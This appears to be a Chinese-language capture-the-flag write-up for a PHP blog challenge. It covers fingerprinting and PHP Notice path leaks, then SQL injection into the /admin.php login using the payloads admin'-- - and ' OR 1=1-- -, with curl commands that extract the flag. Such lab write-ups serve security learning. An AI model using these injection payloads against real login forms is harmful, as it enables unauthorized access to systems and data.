## 题解

### 入口与指纹

`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，页面标题 `Blog Home`。

首页有一个分类下拉框，但**它坏了**——`Notice: Undefined variable: category in
/var/www/html/index.php on line 28` 重复出现，说明模板里写错了变量名（`$category` 未定义）。
结果就是分类筛选完全不生效，选什么都返回全部 10 篇文章。

这类 Notice 的价值在于**泄露了源码路径与行号**，但真正有用的是接下来发现的隐藏页面：

| 路径 | 结果 |
| --- | --- |
| `/admin.php` | **200，管理员登录表单** |
| `/flag.php` | 200，**0 字节**（空响应，说明要满足某个条件才输出） |
| `/post.php`、`/search.php`、`/login.php`、`/upload.php` | 404 |

下拉框里还藏着一个 `Secret` 分类（`<option value='Secret'>`），但它不是入口——
选它同样返回全部文章，只是又一个残留在模板里的值。

### 关键观察

**1. `/flag.php` 返回 200 但空 body —— 它是"被保护"的出口。**

```bash
curl -i http://$T/flag.php
# HTTP/1.1 200 OK
# Content-Length: 0
```

说明它内部检查某种状态（登录/会话/参数），不满足就静默返回空。

**2. `/admin.php` 的登录是拼接 SQL。**

```bash
curl -X POST -d 'username=admin&password=admin' http://$T/admin.php
# Invalid（702 字节：登录页 + 错误提示）
```

把用户名改成注释截断：

```bash
curl -X POST --data-urlencode "username=admin'-- -" --data-urlencode 'password=x' http://$T/admin.php
```

响应变成 **688 字节**，正文里直接是：

```text
flag{d85575cb-8872-4b2d-b617-b662bfe05086}
```

即：`WHERE username = 'admin'-- -' AND password = '…'` 把口令条件注释掉，
登录成功分支把 flag 打了出来。

`' OR 1=1-- -` 同样可行。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode 'password=x' \
  "http://$T/admin.php" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

`/admin.php` 登录成功分支的响应正文（不需要再访问 `/flag.php`）。

## 复盘

- **PHP Notice 会告诉你目录结构，也常顺带暴露逻辑错误。** 这里的
  `Undefined variable: category in /var/www/html/index.php on line 28`
  说明分类筛选形同虚设；顺着 `/var/www/html/` 再枚举同目录页面，就找到了
  `/admin.php` 和 `/flag.php`。
- **`200 + 空 body` 是"有条件输出"的强信号。** `/flag.php` 不报 403 也不 404，
  只是什么都不给——说明它在等某个状态（而非没有这个文件）。
- **下拉框里的 `Secret` 选项是干扰项。** 分类过滤失效，所以选它没用；
  真正能用的是 `/admin.php` 的登录注入。**先验证功能是否真的生效**，
  再决定要不要围绕它做文章。
- **注释截断是最短路径。** `admin'-- -` 一次就过，
  不需要 `OR 1=1`（后者会把多行都匹配上，某些实现反而报错）。
- **先看状态码再看长度。** 失败 702 字节、成功 688 字节——差异不大，
  但如果只看 `Invalid` 文案会漏掉；直接 `grep flag{` 最可靠。
